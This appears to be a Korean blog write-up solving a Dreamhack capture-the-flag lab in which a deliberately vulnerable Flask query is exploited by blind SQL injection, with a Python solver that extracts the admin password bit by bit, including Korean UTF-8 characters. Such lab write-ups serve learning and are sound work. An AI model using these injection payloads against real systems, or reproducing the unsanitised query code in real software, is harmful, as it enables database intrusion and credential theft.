---
title: "드림핵 lv.2 - blind sql injection advanced"
date: 2025-02-28 00:00:00 +0800
categories: [Wargame, Dreamhack]
tags: [cyber security, writeup, dreamhack, web hacking, blind sql injection] 
description: 드림핵 blind sql injection advanced 웹해킹 워게임 풀이
---

[https://dreamhack.io/wargame/challenges/411](https://dreamhack.io/wargame/challenges/411)
# 문제 설명
Exercise: Blind SQL Injection Advanced에서 실습하는 문제입니다.  
**관리자의 비밀번호는 "아스키코드"와 "한글"로 구성되어 있습니다.**

---
# 문제 풀이
## 웹사이트 분석
사이트에 접속해보면 `SELECT * FROM users WHERE uid='';` 문자열이 뜨고 그 아래에 `uid`의 값을 입력할 수 있는 Input box와 submit 버튼이 보인다. <br />


인풋에 값을 입력하면 쿼리의 `uid=''` 사이에 들어가는 것이 분명하다. 그리고 문제 제목을 보면 Blind SQLI를 이용해서 해결하는 문제라는 것도 분명하다. <br />

본격적으로 문제를 풀기 이전에 좀 더 많은 정보를 위해서 코드도 살펴보자.
## 코드 분석
```
[Code Structure]
deploy/
	- app.py
	- init.sql
	- requirements.txt
	- run.sh
DockerFile
```
### app.py
```python
@app.route('/', methods=['GET'])
def index():
    uid = request.args.get('uid', '')
    nrows = 0

    if uid:
        cur = mysql.connection.cursor()
        nrows = cur.execute(f"SELECT * FROM users WHERE uid='{uid}';")

    return render_template_string(template, uid=uid, nrows=nrows)
```
 다른 부분들은 HTML 관련이라서 라우터 부분만 가져왔다.<br />
 예상대로 유저로부터 받은 `uid` 값을 필터링하지 않기 때문에 인젝션 공격에 굉장히 취약하다.
### DockerFile
```docker
...

# DB
RUN /bin/bash -c "/usr/bin/mysqld_safe &" && \
  sleep 5 && \
  mysql -uroot < /app/init.sql
RUN rm /app/init.sql

...
```
### init.sql
```sql
CREATE DATABASE user_db CHARACTER SET utf8;
GRANT ALL PRIVILEGES ON user_db.* TO 'dbuser'@'localhost' IDENTIFIED BY 'dbpass';

USE `user_db`;
CREATE TABLE users (
  idx int auto_increment primary key,
  uid varchar(128) not null,
  upw varchar(128) not null
);

INSERT INTO users (uid, upw) values ('admin', 'DH{**FLAG**}');
INSERT INTO users (uid, upw) values ('guest', 'guest');
INSERT INTO users (uid, upw) values ('test', 'test');
FLUSH PRIVILEGES;
```
`DockerFile`을 보면 서버가 실행될 때 `init.sql`이 함께 실행된다.<br />
SQL 코드를 보면 `users`라는 테이블이 하나 생성되고 그 안에 샘플 유저 값들이 입력되는데 admin이라는 유저의 비밀번호가 플래그임을 보여준다.
## 최종 풀이
```sql
SELECT * FROM users WHERE uid='';
```
결론적으로 우리가 해야할 것은 위의 쿼리를 이용해서 비밀번호를 알아내야한다. <br />
### 테스트
```
user "admin' and substr(upw, 1, 1)='D' -- " exists.
```
우선 테스트용으로 `admin' and substr(upw, 1, 1)='D' -- `를 입력해서 유저를 얻어올 수 있는지 체크가 필요하다.<br />
다행히도 해당 유저가 존재한다고 출력이 된다. 유저의 비밀번호가 'D'로 시작하는 것은 `init.sql`에서 알 수 있다.
### 문제점
이제 익스플로잇을 작성하고 brute forcing 하면 되는데 문제가 있다. <br />

문제를 읽어보면 비밀번호는 아스키코드와 **한글**로 이루어져 있다고 한다. 아스키코드는 완전 탐색으로 하던 이진 탐색으로 하던 그럭저럭 할만한데 한글은 가능한 경우의 수만 1만개가 넘는다. (utf-8 언어셋의 한글은 11,172개가 있다고 한다.)<br />

그래서 여기서 사용하면 좋을 방법은 비트 연산을 이용한 풀이이다.
### 비밀번호 길이 구하기
본격적으로 시작하기 이전에 비밀번호의 길이를 먼저 알아내는게 좋다.
```python
class Solver:
    def __init__(self):
        self.url = "http://host1.dreamhack.games:15103/?uid="
        self.length = 0
    
    def _getPWLength(self):
        for length in range(1, 100):
            query = f"admin' and char_length(upw) = {length} -- "
            resp = requests.get(self.url + query)

            if "exists" in resp.text:
                self.length = length
                break

    def solve(self):
        self._getPWLength()
        print(self.length)
```
해당 코드를 실행해주면 비밀번호 길이로 13이 나오게된다.
### 비밀번호의 각 문자마다 비트 수 알아내기
아스키 문자로만 이루어져있다면 비트 수가 7로 고정이지만 이 경우에는 그렇지 않다 그래서 모든 문자마다 비트열이 어떤지 알아내는 과정이 필요하다.

```python
def _getBitLengths(self):
	for i in range(1, self.length + 1):
		bitLength = 0

		while True:
			bitLength += 1
			query = f"admin' and length(bin(ord(substr(upw, {i}, 1)))) = {bitLength} -- "
			resp = requests.get(self.url + query)
			if "exists" in resp.text:
				self.bitLens.append(bitLength)
				break

def solve(self):
	self._getPWLength()
	print(self.length)
	self._getBitLengths()
	print(self.bitLens)
```
### 비밀번호의 각 문자마다 비트열 알아내기
```python
def _getBitStrings(self):
	for i, bitLength in enumerate(self.bitLens):
		bits = ""
		for j in range(1, bitLength + 1):
			query = f"admin' and substr(bin(ord(substr(upw, {i + 1}, 1))), {j}, 1) = '1' -- "
			resp = requests.get(self.url + query)

			if "exists" in resp.text:
				bits += '1'
			else:
				bits += '0'
			
		self.bits.append(bits)

def solve(self):
	self._getBitStrings()
	print(self.bits)
```
### 최종 비밀번호 알아내기
```python
def _getActualChar(self):
	for i in range(0, self.length):
		byte = int.to_bytes(int(self.bits[i], 2), (self.bitLens[i] + 7) // 8, "big")
		byteInt = int.from_bytes(byte, "big")

		if byteInt > 127: 
			self.result += byte.decode("utf-8")
		else:
			print(byteInt)
			self.result += chr(byteInt)

def solve(self):
	self._getActualChar()
	print(self.result)
```
이렇게 마지막 코드를 실행하게 되면 최종 비밀번호를 얻을 수 있게 된다. 비밀번호의 형식 자체가 `DH{}` 플래그 형식이라 곧바로 제출하면 끝이다.<br />

아스키 문자와 한글로 이루어져 있다고 했는데 사실상 `DH{}`와 특수 문자 2개를 제외하고는 모두 다 한글이었다.
# 배운 것
Blind SQLI를 비트 연산을 통해서 수행하는 법을 익힐 수 있었다.<br />
비트 문자열을 숫자 그리고 문자로 변환하는 방법에 대해 알게됐다, 특히나 utf-8에 관련해서.
